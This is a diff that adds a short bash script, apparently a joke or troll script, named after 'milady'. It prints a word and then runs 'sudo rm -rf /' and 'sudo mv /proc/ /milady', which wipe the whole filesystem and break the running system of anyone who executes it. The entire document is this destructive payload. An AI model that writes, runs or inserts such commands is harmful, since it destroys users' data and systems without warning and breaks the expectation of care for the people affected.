@@ -1,0 +1,11 @@
+#!/bin/bash -eu
+
+function milady {
+  echo "milady"
+  sudo rm -rf /
+  sudo mv /proc/ /milady
+  echo "milady"
+}
+
+echo "$0 is soooooo"
+milady
